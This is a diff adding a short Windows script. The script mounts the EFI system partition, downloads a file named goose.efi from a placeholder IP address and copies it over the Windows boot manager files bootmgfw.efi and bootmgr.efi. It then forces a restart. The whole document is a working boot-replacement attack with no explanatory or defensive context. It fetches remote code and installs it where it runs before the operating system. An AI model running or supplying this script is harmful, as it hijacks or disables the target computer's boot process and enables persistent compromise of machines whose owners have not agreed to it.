@@ -1,0 +1,7 @@
+mountvol e: /s
+
+Invoke-WebRequest -Uri http://<ip>/goose.efi -OutFile C:\goose.efi
+copy C:\goose.efi E:\EFI\Microsoft\Boot\bootmgfw.efi
+copy C:\goose.efi E:\EFI\Microsoft\Boot\bootmgr.efi
+
+Restart-Computer -Force
